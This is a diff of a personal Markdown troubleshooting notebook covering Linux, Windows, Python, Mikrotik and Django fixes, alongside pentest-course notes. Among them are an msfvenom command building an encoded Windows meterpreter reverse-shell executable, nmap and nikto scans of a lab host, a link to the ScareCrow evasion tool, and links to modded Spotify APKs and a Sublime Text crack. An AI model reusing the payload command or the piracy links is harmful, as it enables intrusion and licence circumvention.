@@ -1,40 +1,39 @@
 # The Personal Book Of Problems
-# How To Backup android apk using adb
+## How To Backup android apk using adb
 
-[LINK 1](https://a2zapk.io/Search/spotify/page/51/user=Z2RVeWdpK0RGTmlRYUowVzZyRzF0dUliRnNYay9meGFLZ3FVSjJTUkJ0UDZFU1cySmtuM3hTck05NUVJQk1yUw==/)
+[A2ZAPK](https://a2zapk.io/Search/spotify/page/51/user=Z2RVeWdpK0RGTmlRYUowVzZyRzF0dUliRnNYay9meGFLZ3FVSjJTUkJ0UDZFU1cySmtuM3hTck05NUVJQk1yUw==/)
 
-[LINK 2](https://xdaforums.com/c/android-tv.4276/)
+[XDA FORUMS](https://xdaforums.com/c/android-tv.4276/)
 
-[LINK 3](https://forum.release-apk.com/viewforum.php?f=27)
+[FORUM RELEASE](https://forum.release-apk.com/viewforum.php?f=27)
 
-[LINK 4](https://www.reddit.com/r/AndroidTV/comments/vl3tp9/websites_for_modded_android_tv_apps/?rdt=37692)
+[REDDIT ANDROID TV](https://www.reddit.com/r/AndroidTV/comments/vl3tp9/websites_for_modded_android_tv_apps/?rdt=37692)
 
-[LINK 5](https://www.reddit.com/r/AndroidTV/comments/vl3tp9/websites_for_modded_android_tv_apps/?rdt=37692)
+[REDDIT ANDROID TV](https://www.reddit.com/r/AndroidTV/comments/vl3tp9/websites_for_modded_android_tv_apps/?rdt=37692)
 
-[LINK 6](https://github.com/eviabs/Android-Backup-and-Restore-Guide/blob/master/Android%20Backup%20and%20Restore%20Guide.md)
+[Android-Backup-and-Restore-Guide](https://github.com/eviabs/Android-Backup-and-Restore-Guide/blob/master/Android%20Backup%20and%20Restore%20Guide.md)
 
-[LINK 7](https://gist.github.com/AnatomicJC/e773dd55ae60ab0b2d6dd2351eb977c1)
+[android-backup-apk-and-datas.md](https://gist.github.com/AnatomicJC/e773dd55ae60ab0b2d6dd2351eb977c1)
 
-[LINK 8](https://apk4free.net/spotify-music-premium/)
+[APK4 FREE](https://apk4free.net/spotify-music-premium/)
 
-[LINK 9](https://modilimitado-io.translate.goog/pt/spotify-apk/?_x_tr_sl=pt&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=sc)
+[Modillimited](https://modilimitado-io.translate.goog/pt/spotify-apk/?_x_tr_sl=pt&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=sc)
 
-[LINK 10](https://modilimitado.io/pt/spotify-apk/)
+[Modillimited](https://modilimitado.io/pt/spotify-apk/)
 
-[LINK 11](https://www.4shared.com/postDownload/VbNr0VjXjq/SpotifyTV_MOD_v1733_androidtun.html)
+[4SHARED ](https://www.4shared.com/postDownload/VbNr0VjXjq/SpotifyTV_MOD_v1733_androidtun.html)
 
-[LINK 12](https://www.4shared.com/web/q?offset=0&category=8&query=spotify%20tv&type=apk)
+[4SHARED](https://www.4shared.com/web/q?offset=0&category=8&query=spotify%20tv&type=apk)
 
-[LINK 13](https://hostapk.com/tag/spotify-music-for-android-tv-1-9-0-mod-beta/)
+[HostAPK](https://hostapk.com/tag/spotify-music-for-android-tv-1-9-0-mod-beta/)
 
-[LINK 14](https://apkmody.mobi/apps/app-420373002706606446)
+[APKMODY](https://apkmody.mobi/apps/app-420373002706606446)
 
-[LINK 15](https://ihackedit.com/spotify-music-for-android-tv-premium-mod-apk/)
+[iHackedit](https://ihackedit.com/spotify-music-for-android-tv-premium-mod-apk/)
 
 
 
-###  Mikrotik traffic injector
-#### interface creation via the terminal
+## Network interface creation using Terminal
 
 ```bash 
 ip link add name virtual type bridge
@@ -44,26 +43,25 @@ wireshark
 ```
 
 
-### Mikrotik Chnage Macaddress via cli
+## mikrotik Change Macaddress via cli
 ```
 /interface ethernet set ether1 mac-address=DC:2C:6E:9E:9D:42
 ```
 
-### MSFCONSOLE DB
-2015  service postgresql start
- 2016  service postgresql status
- 2017  msfdb  status
- 2018  msfdb init
+## msfconsole database quick setup
+
+*quick commands*
+```
+service postgresql start
+service postgresql status
+msfdb  status
+msfdb init
 db_connect msf:melody@localhost/msf
 
+```
 
-###  quick change linux host name
-ubuntu@(none):~$ sudo true
-sudo: unable to resolve host (none)
-edit /etc/hostname and hosts
-
-
-### msfconsole database
+**command output**
+``` msfconsole database
 └──╼[ZERODIUM]#msfdb init
 [i] Database already started
 [+] Creating database user 'msf'
@@ -75,38 +73,55 @@ edit /etc/hostname and hosts
 └──╼[ZERODIUM]#nano /usr/share/meta/usr/share/metasploit-framework/config/database.yml
 (venv) ┌──[[Thu May 23 08:25:17 AM EAT 2024]root@parrot]─[/usr/share/wordlists]
 └──╼[ZERODIUM]#
+```
 
 
+##  Quick change linux host name
 
-##install crypto module python
-pycrypto pycryptodome Cryrpto req vc 9.0+ to compile and install 
-fuck case sensitivity
-5
+> Error encountered
+
+ubuntu@(none):~$ sudo true
+sudo: unable to resolve host (none)
+
+edit /etc/hostname and hosts
+```
+sudo nano /etc/hostname
+```
+
+
+## Installing crypto module python library
+pycrypto pycryptodome Cryrpto 
+
+__requires vc 9.0+ to compile and install__
+
 Well this might appear weird but after installing pycrypto or pycryptodome , we need to update the directory name crypto to Crypto in lib/site-packages
 
-##fix cmd opens store when python is typed
-disable app aliases in windows advanced settings
+~~fuck case sensitivity~~
 
-#Cannot spawn a message bus without a machine-id: Unable to load /var/lib/dbus/machine-id or /etc/machine-id: Failed to open file “/var/lib/dbus/machine-id”: No such file or directory
-#Cannot spawn a message bus without a machine-id: Unable to load /var/lib/dbus/machine-id or /etc/machine-id: Failed to open file “/var/lib/dbus/machine-id”: No such file or directory
+ 
+
+## fix cmd opens store when python is typed in windows
+[x] JUst Need To Disable app aliases in windows advanced settings
+
+## solve cat: /etc/machine-id: no such file or directory
+*fix error message*
+```
+Cannot spawn a message bus without a machine-id: Unable to load /var/lib/dbus/machine-id or /etc/machine-id: Failed to open file “/var/lib/dbus/machine-id”: No such file or directory
+Cannot spawn a message bus without a machine-id: Unable to load /var/lib/dbus/machine-id or /etc/machine-id: Failed to open file “/var/lib/dbus/machine-id”: No such file or directory
 fix
-I had a fresh install of MX Linux (Debian based) with everything up to date. After installing the Daedalus wallet I tried opening it from the applications list and nothing would happen. So I tried opening through the command line which would then give me the error "cat: /etc/machine-id: no such file or directory". I guess the wallet tries to cat the machine-id file when it opens but for some reason was missing. I found a Debian wiki article about Machine-Id and the commands to generate a new one.
-
+"cat: /etc/machine-id: no such file or directory". 
+```
+### fix for the issue
+```
 rm -f /etc/machine-id /var/lib/dbus/machine-id
 
 dbus-uuidgen --ensure=/etc/machine-id
 
 dbus-uuidgen --ensure
+```
 
-This solved the issue and now it works properly.
-
-
-#fix go issues
- export GOROOT=/usr/lib/go-1.21/
- copy to be built in /root/go/src
- use go get what missing
- 
-
+## golang error message
+```
 #─[[Tue Apr 30 12:44:12 PM EAT 2024]root@parrot]─[/opt/bypas]
 └──╼[ZERODIUM]#go get github.com/fatih/color
 go: go.mod file not found in current directory or any parent directory.
@@ -117,6 +132,15 @@ go: go.mod file not found in current directory or any parent directory.
     or run 'go help get' or 'go help install'.
 https://stackoverflow.com/questions/66894200/error-message-go-go-mod-file-not-found-in-current-directory-or-any-parent-dire
 294
+```
+
+**commands to fix the go issues**
+ ```
+ export GOROOT=/usr/lib/go-1.21/
+ copy to be built in /root/go/src
+ use go get what missing
+ 
+
 
 Change this:
 
@@ -125,13 +149,20 @@ go env -w GO111MODULE=auto
 to this:
 
 go env -w GO111MODULE=off
+```
 
-#have scarecrow
-https://www.grahamhelton.com/blog/scarecrow/
 
+## install scarecrow
+[GITHUB PAGE TO CLONE](https://www.grahamhelton.com/blog/scarecrow/)
+
+## MSFVENOM QUICK PAYLOAD GENERATION
+```
 └──╼[ZERODIUM]#msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.200.224 lport=54654 -f exe -o /media/sf_Shared/own/loader.exe -e  x86/call4_dword_xor -i 00556
+```
 
+## SSH KEY FIX error message
 
+```
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 @    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@ -147,111 +178,113 @@ Offending ECDSA key in /root/.ssh/known_hosts:8
   ssh-keygen -f "/root/.ssh/known_hosts" -R "192.168.200.177"
 Host key for 192.168.200.177 has changed and you have requested strict checking.
 Host key verification failed.
+```
+**fix for ssh key error**
+```
+ssh-keygen -f "/root/.ssh/known_hosts" -R "192.168.200.177"
+```
 
 
-#snap install whatsapp
+## INSTALL WHATSAPP USING SNAP
+```
 snap install whatsapp-for-linux
-##apphub
-https://www.appimagehub.com/
-##fix dependencies not installing on apt just use aptitude
-##linux whatsapp
-https://github.com/eneshecan/whatsapp-for-linux
+```
 
-#install routeros on winbox
-https://www.youtube.com/watch?v=gOmjZ01lfkQ
-
-#unix swapfile
-https://www.youtube.com/watch?v=HSbBl31ohjE
+## apphub LINKS
+[APPHUB](https://www.appimagehub.com/)
 
 
-#remmotely access mikrooik router from anywhere
-https://www.youtube.com/watch?v=x3e8T-y9kTE
-#install snap using 
-sudo apt install snapd
-#then install atom
-snap install atom --classic
+## to fix dependencies not installing on apt just use aptitude
 
-##fix parrot os issue on virtualbox
-https://unix.stackexchange.com/questions/257203/booting-stops-at-loading-initial-ramdisk/620355#620355
+## linux whatsapp
+[WHATSAPP FOR LINUX](https://github.com/eneshecan/whatsapp-for-linux)
 
-https://askubuntu.com/questions/1240152/boot-freezes-and-loading-initial-ramdisk
-Other way, In safe-mode or command line, edit /etc/default/grub and replace in the existing configuration line
+## install routeros on winbox
 
+[Netinstall on mikrotik](https://www.youtube.com/watch?v=gOmjZ01lfkQ)
+
+## unix swapfile
+
+[LINUX SWAPFILE CREATION](https://www.youtube.com/watch?v=HSbBl31ohjE)
+
+
+## remmotely access mikroTik router from anywhere
+
+[MIKROTIK REMOTE ACCESS FROM ANYWHERE](https://www.youtube.com/watch?v=x3e8T-y9kTE)
+
+## HOW TO install snap using apt
+```sudo apt install snapd```
+
+*then install atom ide from terminal*
+
+```snap install atom --classic```
+
+## fix parrot os issue on virtualbox
+[fix parrot os issue on virtualbox](https://unix.stackexchange.com/questions/257203/booting-stops-at-loading-initial-ramdisk/620355#620355
+
+[boot-freezes-and-loading-initial-ramdisk ](https://askubuntu.com/questions/1240152/boot-freezes-and-loading-initial-ramdisk)
+
+**Other way, In safe-mode or command line, edit /etc/default/grub and replace in the existing configuration line**
+```
 GRUB_CMDLINE_LINUX_DEFAULT="quiet splash"
 
 with
 
 GRUB_CMDLINE_LINUX_DEFAULT="dis_ucode_ldr"
+```
 
-the issue is either caused by restarting in a different display configurati
-
-
-##fix blur failing to connect to multi user mode
-disable virtualbox internet adapter
-disable widows firewall
+> The issue is either caused by restarting in a different display configuration
 
 
-##FIX WINDOWS 11 HOT KEY POP UPS ERROR
-disable hp hotkey uwp service
+## fix blur failing to connect to multi user mode
+
+> disable virtualbox internet adapter
+> disable widows firewall
 
 
-##fix  windows 11 eduroam network wifi issue
-##fix windows not connecting to eduroam
+## FIX WINDOWS 11 HOT KEY POP UPS ERROR
+*disable hp hotkey uwp service*
 
-The problem can probably be solved either by the data center, though that's probably a lot of work, because they have to update the radius for TLS 1.3. New Windows 11 22h2 forces your device to connect via TLS 1.3 (although TLS 1.3. is like.. not even out yet). But you can change the registry, so it ain't gonna use 1.3. again by following these instructions:
 
-Add this value to the registry (windows key + R, enter regedit...make the addition below to the specified directory) , then TLS <1.3 will be enforced:
+## fix  windows 11 eduroam network wifi issue
+**fix windows not connecting to eduroam**
 
+*The problem can probably be solved either by the data center, though that's probably a lot of work, because they have to update the radius for TLS 1.3. New Windows 11 22h2 forces your device to connect via TLS 1.3 (although TLS 1.3. is like.. not even out yet). But you can change the registry, so it ain't gonna use 1.3. again by following these instructions:*
+
+**Add this value to the registry (windows key + R, enter regedit...make the addition below to the specified directory) , then TLS <1.3 will be enforced:**
+
+```
 [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RasMan\PPP\EAP\13]
 
-"TLSVersion"=dword:00000fc0
+"TLSVersion"=dword:00000fc0 
+```
 
 
-#set color temp
-https://github.com/faf0/sct
+## set color temp
+[COLOR TEMP](https://github.com/faf0/sct)
 
-https://stackoverflow.com/questions/5299989/x11-xlib-h-not-found-in-ubuntu
+**Fix MIssing Modules**
 
-
+[Fix xlib Module](https://stackoverflow.com/questions/5299989/x11-xlib-h-not-found-in-ubuntu)
+```
     sudo apt-get install libx11-dev ................. for X11/Xlib.h
     sudo apt-get install mesa-common-dev........ for GL/glx.h
     sudo apt-get install libglu1-mesa-dev ..... for GL/glu.h
     sudo apt-get install libxrandr-dev ........... for X11/extensions/Xrandr.h
     sudo apt-get install libxi-dev ................... for X11/extensions/XInput.h
+```
 
+## CPE : client premises equipment
 
-cpe client premises equipment
+## Disbale windows 11 updates
 
-##disbale windows 11 updates
-In Registry Editor, navigate to the following path: HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows using the navigation tree on the left.
+* In Registry Editor, navigate to the following path: HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows using the navigation tree on the left.
 Screenshot of a Windows 11 desktop with the Windows Update page showing updates are paused
 This article is part of a directory: Windows 11 installation and activation: Everything you need to know
-Table of contents
-Installing Windows 11
-Installing Windows 11
-How to download and install Windows 11
-How to install Windows 11 on a new PC
-How to install Windows 11 on almost any unsupported PC
-How to install Windows 11 on your Steam Deck
-How to install Windows 11 on a Mac
-(Advanced) How to use UUP dump to create an updated Windows ISO for any channel
-Activating Windows 11
-Activating Windows 11
-How to activate Windows
-How to activate Windows with Command Prompt (CMD)
-How to upgrade from Windows 11 Home to Pro
-Windows 11 Home vs Windows 11 Pro: Here are the differences
-Manage Windows 11 updates
-Manage Windows 11 updates
-How to stop receiving updates on Windows 11
-How to update drivers in Windows 11
-How to update Intel and AMD chipset drivers
-How to update the graphics driver on your PC
-How to update audio drivers in Windows 11
-Table of contents
-Readers like you help support XDA Developers. When you make a purchase using links on our site, we may earn an affiliate commission. Read More.
 
-Generally speaking, keeping your Windows 11 PC up to date is always recommended. But every now and then, Microsoft tends to release some updates with big problems, and it doesn't hurt to hold off on an update for a few days to make sure you won't have glaring issues.
+
+
+> Generally speaking, keeping your Windows 11 PC up to date is always recommended. But every now and then, Microsoft tends to release some updates with big problems, and it doesn't hurt to hold off on an update for a few days to make sure you won't have glaring issues.
 Close
 
 Thankfully, Microsoft does give you the option to do exactly that and keep updates away from your PC, at least temporarily. If you want to avoid updates on your Windows 11 PC, here's what you can do.
@@ -291,41 +324,49 @@ With that being said, if you feel comfortable using it, here's what you need to 
     Name the new key WindowsUpdate and hit Enter.
     Right-click on WindowsUpdate and select New, then Key.
     Call this key AU and hit Enter again. Your navigation tree should look like this.
-NoAutoUpdate
-
+**NoAutoUpdate**
+```
 sc query wuauserv
 sc stop wuauserv
 sc config 
 sc config wuauserv start="disabled"
+```
 
-##get pip for python2
-curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
+## get pip for python2
+```curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
 sudo python2 get-pip.py
-###err
-WARNING: Retrying (Retry(total=4, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError("Can't connect to HTTPS URL because the SSL module is not available.",)': /simple/pip/
-
+```
+## PYTHON SSL ERROR
+```WARNING: Retrying (Retry(total=4, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError("Can't connect to HTTPS URL because the SSL module is not available.",)': /simple/pip/
+```
+**commands to fix the issue**
+```
 apt-get install  libncursesw5-dev libssl-dev libsqlite3-dev tk-dev libgdbm-dev libc6-dev libbz2-dev 
+```
 
-#install python2 on ubuntu
+## install python2 on ubuntu
 
-Code:
-
+* Code:
+```
 wget https://www.python.org/ftp/python/2.7.9/Python-2.7.9.tgz
 sudo tar xzf Python-2.7.9.tgz
 cd Python-2.7.9
 sudo ./configure --enable-optimizations
 sudo make altinstall
 wget https://www.python.org/ftp/python/2.7.18/Python-2.7.18.tgz
+```
 
-Code:
+Continue:
 
+```
 python2.7 -V
 ~ Python 2.7.9
 sudo ln -sfn '/usr/local/bin/python2.7' '/usr/bin/python2'
 sudo update-alternatives --install /usr/bin/python python /usr/bin/python2 1
+```
 
-Code:
-
+**output will look like**
+```
 sudo update-alternatives --config python
 * 0            /usr/bin/python3   2         auto mode
   1            /usr/bin/python2   1         manual mode
@@ -333,8 +374,10 @@ sudo update-alternatives --config python
 
 
 Press <enter> to keep the current choice[*], or type selection number:
+```
 
-##sort pip alternatives
+## sort pip alternatives
+```
 └──╼ #update-alternatives --install /usr/bin/pip pip /usr/local/bin/pip2 1
 update-alternatives: using /usr/local/bin/pip2 to provide /usr/bin/pip (pip) in auto mode
 update-alternatives: warning: not replacing /usr/bin/pip with a link
@@ -347,31 +390,37 @@ update-alternatives: using /usr/bin/pip3 to provide /usr/bin/pip (pip) in auto m
 update-alternatives: warning: not replacing /usr/bin/pip with a link
 ┌─[root@parrot]─[/home/user/Downloads]
 └──╼ #
+```
+
+## nano reference nanorc settings
+
+[NANORC CONFIG SETTINGS](https://bash-prompt.net/guides/nanorc-settings/)
 
 
-#nano reference nanorc settings
-https://bash-prompt.net/guides/nanorc-settings/
 
+## Installing cracked sublime patch for linux
+*Download sublimepatch*
 
+[SUBLIME TEXT](https://github.com/CodigoCristo/sublimepatch)
 
-#Installing cracked sublime patch for linux
-sublimepatch
-https://github.com/CodigoCristo/sublimepatch
-#sublime version download link
-https://download.sublimetext.com/sublime-text_build-4152_amd64.deb
+## sublime version download link
 
-#installing wing ide
-link personal
-https://wingware.com/pub/wing-personal/7.2.9.0/
+[SUBLIME TO CRACK](https://download.sublimetext.com/sublime-text_build-4152_amd64.deb)
 
-#fix markdown files not being opened on linux firefox
-How to get the Markdown Viewer addon of Firefox to work on Linux?
-https://www.youtube.com/watch?v=ze5v4VQ8fNo
-https://superuser.com/questions/696361/how-to-get-the-markdown-viewer-addon-of-firefox-to-work-on-linux
+## installing wing ide
+[wing ide link personal](https://wingware.com/pub/wing-personal/7.2.9.0/)
+
+## fix markdown files not being opened on linux firefox
+
+[How to get the Markdown Viewer addon of Firefox to work on Linux?](https://www.youtube.com/watch?v=ze5v4VQ8fNo)
+
+[fix markdown issue](https://superuser.com/questions/696361/how-to-get-the-markdown-viewer-addon-of-firefox-to-work-on-linux)
+
+```
 ~/.local/share/mime/packages/text-markdown.xml
 sudo mkdir -p /usr/local/share/mime/packages
-   85  sudo mkdir -p /usr/local/share/mime/packages
-   87  sudo pluma /usr/local/share/mime/packages/text-markdown.xml
+    sudo mkdir -p /usr/local/share/mime/packages
+    sudo pluma /usr/local/share/mime/packages/text-markdown.xml
    
 <?xml version="1.0"?>
 <mime-info xmlns='http://www.freedesktop.org/standards/shared-mime-info'>
@@ -382,20 +431,24 @@ sudo mkdir -p /usr/local/share/mime/packages
   </mime-type>
 </mime-info>
 
-   88  update-mime-database /usr/local/share/mime
+    update-mime-database /usr/local/share/mime
+
+```
 
 
-#best markdown editor
-
-#set timezone on parrot
-timedatectl set-timezone Africa/Nairobi
+## set timezone on parrot
+`timedatectl set-timezone Africa/Nairobi`
 
 
 
-##Django web hacking course
-python manage.py migrate
+## Django web hacking course
+`python manage.py migrate`
 
-#web proffesional hacking
+## web proffesional hacking course
+
+__code snippet and commands__
+
+```
 jdango-admin startproject tauntaun_dispatch
 cd tauntaun_dispatch
 ls
@@ -404,78 +457,92 @@ nano settings.py
 cd ..
 python manage.py migrate
 cd tauntaun_dispatch
+```
+```
 nano view.py
+
+
  from django.http import HttpResponse
- 2
- 3 def index(request):
- 4     return HttpResponse("index")
- 5
- 6 def tauntaun_request(request):
- 7     return HttpResponse("tauntaun-request")
- 8
-
+ 
+  def index(request):
+      return HttpResponse("index")
+ 
+  def tauntaun_request(request):
+      return HttpResponse("tauntaun-request")
+ 
 nano urls.py
-
+```
+```
 python manage.py runserver
+```
 
+```
 nano tauntaun_dispatch/models.py
+```
 
+
+```
 from django.db import models
 from django.db import models
- 2
- 3 class Reservation(models.Model):
- 4     name = models.CharField(max_length=30)
- 5     date = models.DateField()
+ 
+  class Reservation(models.Model):
+      name = models.CharField(max_length=30)
+      date = models.DateField()
+```
 
-
+```
 python manage.py makemigrations tauntaun_dispatch
 python manage.py migrate
+```
 
-#mkdir tauntaun_dispatch/templates
+
+`mkdir tauntaun_dispatch/templates`
+
+
+```
 ┌─[root@parrot]─[/home/user/Desktop/exercises/tauntaun_dispatch]
 └──╼ #nano tauntaun_dispatch/templates/index.html
 ┌─[root@parrot]─[/home/user/Desktop/exercises/tauntaun_dispatch]
 └──╼ #nano tauntaun_dispatch/view.py
 ┌─[root@parrot]─[/home/user/Desktop/exercises/tauntaun_dispatch]
 └──╼ #
+```
 
+```
 from django.http import HttpResponse
- 2 from django.shortcuts import render
- 3 from models import Reservation
- 4
- 5 def index(request):
- 6     return render(request,"index.html")
- 7
- 8 def tauntaun_request(request):
- 9     if 'name' in request.POST and 'date' in request.POST:
-10         reservation = Reservation(name=request.POST['name'],date=request.POST['date'])
-11         reservation.save()
-12         return HttpResponse("Your reservation ID is: %s" % reservation.id)
-13     else:
-14         return HttpResponse("Something went wrong, no Taunttaun for you today")
-15
+  from django.shortcuts import render
+  from models import Reservation
+ 
+  def index(request):
+      return render(request,"index.html")
+ 
+  def tauntaun_request(request):
+      if 'name' in request.POST and 'date' in request.POST:
+         reservation = Reservation(name=request.POST['name'],date=request.POST['date'])
+         reservation.save()
+         return HttpResponse("Your reservation ID is: %s" % reservation.id)
+     else:
+         return HttpResponse("Something went wrong, no Taunttaun for you today")
+```
 
 
+## comment out nano tauntaun_dispatch/settings.py csrf line
 
-
-
-15
-
-comment out nano tauntaun_dispatch/settings.py csrf line
-
+```
 sqlite3 db.sqlite3 
 .tables
 SELECT * from tauntaun_dispatch_reservation ;
+```
 
+> jsfiddle.net for js code experiments
 
-jsfiddle.net for js code experiments
+## manual discovery
+## plannning testing reporting
 
-##manual discovery
-#plannning testing reporting
+`nmap syn scan sends basic tcp  syn packets to server to open tcp connection to the server to determine if ports are open or closed`
+`nmap -sS -p 1-65535 192.168.100.4`
 
-nmap syn scan sends basic tcp  syn packets to server to open tcp connection to the server to determine if ports are open or closed
-nmap -sS -p 1-65535 192.168.100.4
-
+```
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-13 21:16 EAT
 Nmap scan report for 192.168.100.4
 Host is up (0.00092s latency).
@@ -486,23 +553,28 @@ PORT     STATE SERVICE
 443/tcp  open  https
 8000/tcp open  http-alt
 MAC Address: 08:00:27:16:6E:AA (Oracle VirtualBox virtual NIC)
+```
 
 
-nmap -A -p 1-65535 192.168.100.4
-
-nikto --host 192.168.100.4 -root /ve
-do nikto scan in a way it tests admin page
-/etc/nikto.conf
-use scanners but dont trust them
+```nmap -A -p 1-65535 192.168.100.4```
 
 
-#browsers and cookies
-server thinks it you if you send back a persons cookie
+`nikto --host 192.168.100.4 -root /ve`
+> do nikto scan in a way it tests admin page
+
+**config file to edit**
+**/etc/nikto.conf**
+
+## NB: use scanners but **dont** trust them
+
+## browsers and cookies
+_server thinks it you if you send back a persons cookie_
+
 cookie:
-
 domain
 path
 time 
+
 if path has root it has entire domain
 
 
@@ -517,30 +589,34 @@ session management cookie in php username stored in session
 attacker steals cookie and connects to application and hijacks session
 if attacker prob set cookie 2 a value he knows and if at login server doesnt change to another value that is not known but uses value from attacker then app is vulnerable to session fixation
  
-#same origin policy
+## same origin policy
 protocol domain policy 
 
 same origin policy makes sure browser cant talk to another website
 dont give up on the first sign of protection
 
-#remove python2.7 manual installed
+## remove python2.7 manualLY installed
+```
 sudo rm -rf /opt/python2.7.9
 ls -l /usr/local/bin/ | grep python
 sudo rm /usr/local/bin/python2.7
 sudo rm /usr/local/bin/pip2.7
 rm $(which python2.7-config)
+```
 
 
-
-#install good python2.7
+## install good python2.7
+```
 wget https://www.python.org/ftp/python/2.7.18/Python-2.7.18.tgz
 tar xzf Python-2.7.18.tgz
 cd Python-2.7.18
 ./configure --with-ssl
 make
 sudo make install
+```
 
-#fix err
+## fix update-alternatives error
+```
 └──╼[ZERODIUM]#update-alternatives --install /usr/bin/pip pip /usr/bin/pip2 1
 update-alternatives: warning: forcing reinstallation of alternative /usr/local/bin/pip2 because link group pip is broken
 update-alternatives: warning: not replacing /usr/bin/pip with a link
@@ -548,6 +624,11 @@ update-alternatives: warning: not replacing /usr/bin/pip with a link
 └──╼[ZERODIUM]#update-alternatives --install /usr/bin/pip pip /usr/bin/pip3 2
 update-alternatives: using /usr/bin/pip3 to provide /usr/bin/pip (pip) in auto mode
 update-alternatives: warning: not replacing /usr/bin/pip with a link
+```
+
+STEPS
+
+```
 1. Check the Current State of /usr/bin/pip
 First, check what exactly is at /usr/bin/pip by running:
 
@@ -568,13 +649,20 @@ sudo rm /usr/bin/pip
 
 3. Recreate the Alternative for pip
 After you’ve removed or moved the existing pip binary, you can try running update-alternatives again to properly set up pip for both Python 2 and Python 3:
+```
 
-For Python 2:
 
+## For Python 2:
+```
 bash
 Copy code
 sudo update-alternatives --install /usr/bin/pip pip /usr/bin/pip2 1
+```
 
+to just display
+
+
+```
 sudo update-alternatives --display pip
 [ZERODIUM]#sudo update-altsudo update-alternatives --display pip
 pip - auto mode
@@ -586,11 +674,11 @@ pip - auto mode
 /usr/local/bin/pip2 - priority 1
 ┌──[[Mon Sep 16 08:14:58 AM EAT 2024]root@Z3r0S3C]─[/opt/main]
 └──╼[ZERODIUM]#
+```
+# DISABLE/enable reply to icmp echo pings for linux
 
-#DISABLE/enable reply to icmp echo pings for linux
 Run the following command to disable ping replies:
-
-bash
+```bash
 Copy code
 sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1
 To make this change permanent (after a reboot), edit the /etc/sysctl.conf file and add the following line:
@@ -603,10 +691,16 @@ After saving the file, apply the changes by running:
 bash
 Copy code
 sudo sysctl -p
+```
 
-#bash: add-apt-repository: command not found
-sudo apt install software-properties-common
-add-apt-repository ppa:zhangsongcui3371/fastfetch
+#  add-apt-repository: command not found
+
+`sudo apt install software-properties-common`
+
+
+`add-apt-repository ppa:zhangsongcui3371/fastfetch`
+
+
 Traceback (most recent call last):
   File "/usr/bin/add-apt-repository", line 361, in <module>
     addaptrepo = AddAptRepository()
@@ -616,8 +710,13 @@ Traceback (most recent call last):
   File "/usr/lib/python3/dist-packages/aptsources/distro.py", line 89, in get_sources
     raise NoDistroTemplateException(
 aptsources.distro.NoDistroTemplateException: Error: could not find a distribution template for Debian/lory
-##for the above first a good way to fix the key issue is
+
+## for the above first a good way to fix the key issue is
+
+```
 apt update
+
+
 Hit:1 https://deb.parrot.sh/parrot lory InRelease
 Get:2 https://deb.parrot.sh/direct/parrot lory-security InRelease [29.4 kB]
 Hit:3 https://deb.parrot.sh/parrot lory-backports InRelease
@@ -630,6 +729,7 @@ W: GPG error: http://ppa.launchpad.net/zhangsongcui3371/fastfetch/ubuntu focal I
 E: The repository 'http://ppa.launchpad.net/zhangsongcui3371/fastfetch/ubuntu focal InRelease' is not signed.
 N: Updating from such a repository can't be done securely, and is therefore disabled by default.
 N: See apt-secure(8) manpage for repository creation and user configuration details.
+
 ┌──[[Tue Sep 17 08:48:51 AM EAT 2024]root@Z3r0S3C]─[/opt/main/mybash]
 └──╼[ZERODIUM]#wget -qO - httpsudo apt-key adv --keyserver keyserver.ubuntu.com --recv-ke^C
 ┌──[[Tue Sep 17 08:48:51 AM EAT 2024]root@Z3r0S3C]─[/opt/main/mybash]
@@ -653,14 +753,19 @@ bash
 Copy code
 sudo apt update
 
+```
+
+## method 2
 
 1. Manually Add the PPA Repository (Alternative Method)
+
 Since PPAs are primarily for Ubuntu and its derivatives, you may be able to add the PPA manually by editing your /etc/apt/sources.list file. Here’s how to do it:
 
 First, find the actual URL for the PPA. PPAs are usually hosted on Launchpad and follow this structure:
 
-php
+
 Copy code
+
 deb http://ppa.launchpad.net/<user>/<repository>/ubuntu <distribution> main
 In your case, the PPA URL would likely be something like:
 
@@ -671,7 +776,7 @@ To manually add this, follow these steps:
 
 Open the /etc/apt/sources.list file for editing:
 
-bash
+```bash
 Copy code
 sudo nano /etc/apt/sources.list
 Add the PPA at the end of the file:
@@ -687,42 +792,39 @@ bash
 Copy code
 sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys <KEY>
 (You'll need to replace <KEY> with the actual key ID of the PPA.)
+```
 
 Update your package list:
 
-bash
+```bash
 Copy code
 sudo apt update
 2. Use a Different Installation Method (Debian-based Systems)
 If your system is not Ubuntu-based but still Debian-based (like Debian Lory), PPAs might not be the best approach. Instead, consider installing the package from an official source, GitHub, or from the source code itself.
+```
 
-For Fastfetch, you can visit the official GitHub repository and follow the installation instructions:
+## For Fastfetch, you can visit the official GitHub repository and follow the installation instructions:
 GitHub repo: https://github.com/LinusDierheimer/fastfetch
 3. Check Your OS Compatibility
 If you're not on an Ubuntu-based system (like Debian), it's best to avoid using PPAs directly as they are not officially supported for non-Ubuntu distros. Stick with packages that are natively supported for your OS or compile the software from source.
 
-Let me know if you'd like help with any of these alternatives!
 
-
-
-
-
-
-You said:
 where am i going to get the actual key ID of the PPA
-ChatGPT said:
-ChatGPT
+
 To find the actual key ID of a PPA, follow these steps:
 
+
 1. Search for the PPA on Launchpad
+
 Go to the Launchpad PPA page and search for the PPA. In your case, the PPA you are interested in is:
 
-bash
+```bash
 Copy code
 ppa:zhangsongcui3371/fastfetch
 You can access the PPA directly by visiting:
+```
 
-bash
+```bash
 Copy code
